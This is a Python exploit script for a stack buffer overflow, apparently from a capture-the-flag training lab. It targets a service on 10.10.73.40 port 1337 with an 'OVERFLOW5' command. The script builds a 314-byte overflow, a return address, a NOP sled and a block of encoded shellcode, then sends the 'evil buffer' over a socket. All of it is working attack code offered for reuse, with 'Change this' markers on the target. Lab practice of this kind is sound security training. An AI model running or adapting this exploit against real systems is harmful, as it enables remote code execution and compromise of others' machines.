import socket

ip = "10.10.73.40" # Change this
port = 1337 # Change this

prefix = "OVERFLOW5 " # Change this
offset = 314
overflow = "A" * offset
retn = "\xaf\x11\x50\x62"
padding = "\x90" * 5
payload = (
"\xfc\xbb\x3e\x7a\xf2\xc9\xeb\x0c\x5e\x56\x31\x1e\xad\x01\xc3"
"\x85\xc0\x75\xf7\xc3\xe8\xef\xff\xff\xff\xc2\x92\x70\xc9\x3a"
"\x63\x15\x43\xdf\x52\x15\x37\x94\xc5\xa5\x33\xf8\xe9\x4e\x11"
"\xe8\x7a\x22\xbe\x1f\xca\x89\x98\x2e\xcb\xa2\xd9\x31\x4f\xb9"
"\x0d\x91\x6e\x72\x40\xd0\xb7\x6f\xa9\x80\x60\xfb\x1c\x34\x04"
"\xb1\x9c\xbf\x56\x57\xa5\x5c\x2e\x56\x84\xf3\x24\x01\x06\xf2"
"\xe9\x39\x0f\xec\xee\x04\xd9\x87\xc5\xf3\xd8\x41\x14\xfb\x77"
"\xac\x98\x0e\x89\xe9\x1f\xf1\xfc\x03\x5c\x8c\x06\xd0\x1e\x4a"
"\x82\xc2\xb9\x19\x34\x2e\x3b\xcd\xa3\xa5\x37\xba\xa0\xe1\x5b"
"\x3d\x64\x9a\x60\xb6\x8b\x4c\xe1\x8c\xaf\x48\xa9\x57\xd1\xc9"
"\x17\x39\xee\x09\xf8\xe6\x4a\x42\x15\xf2\xe6\x09\x72\x37\xcb"
"\xb1\x82\x5f\x5c\xc2\xb0\xc0\xf6\x4c\xf9\x89\xd0\x8b\xfe\xa3"
"\xa5\x03\x01\x4c\xd6\x0a\xc6\x18\x86\x24\xef\x20\x4d\xb4\x10"
"\xf5\xc2\xe4\xbe\xa6\xa2\x54\x7f\x17\x4b\xbe\x70\x48\x6b\xc1"
"\x5a\xe1\x06\x38\x0d\x04\xde\x47\x9c\x70\xe2\x47\x0f\xdd\x6b"
"\xa1\x45\xcd\x3d\x7a\xf2\x74\x64\xf0\x63\x78\xb2\x7d\xa3\xf2"
"\x31\x82\x6a\xf3\x3c\x90\x1b\xf3\x0a\xca\x8a\x0c\xa1\x62\x50"
"\x9e\x2e\x72\x1f\x83\xf8\x25\x48\x75\xf1\xa3\x64\x2c\xab\xd1"
"\x74\xa8\x94\x51\xa3\x09\x1a\x58\x26\x35\x38\x4a\xfe\xb6\x04"
"\x3e\xae\xe0\xd2\xe8\x08\x5b\x95\x42\xc3\x30\x7f\x02\x92\x7a"
"\x40\x54\x9b\x56\x36\xb8\x2a\x0f\x0f\xc7\x83\xc7\x87\xb0\xf9"
"\x77\x67\x6b\xba\x98\x8a\xb9\xb7\x30\x13\x28\x7a\x5d\xa4\x87"
"\xb9\x58\x27\x2d\x42\x9f\x37\x44\x47\xdb\xff\xb5\x35\x74\x6a"
"\xb9\xea\x75\xbf\xb9\x0c\x8a\x40"
)
postfix = ""

buffer = prefix + overflow + retn + padding + payload + postfix

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

try:
  s.connect((ip, port))
  print("Sending evil buffer...")
  s.send(bytes(buffer + "\r\n", "latin-1"))
  print("Done!")
except:
  print("Could not connect.")